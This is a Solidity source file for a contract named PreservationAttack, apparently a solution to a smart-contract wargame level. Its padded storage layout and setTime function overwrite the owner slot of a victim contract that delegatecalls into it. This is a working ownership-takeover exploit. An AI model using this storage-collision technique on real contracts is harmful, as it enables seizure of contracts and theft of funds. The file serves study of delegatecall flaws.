// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    address public placeholder1;
    address public placeholder2;
    address public owner;

    constructor() {}

    function setTime(uint256 newOwner) public {
        owner = address(uint160(newOwner));
    }
}
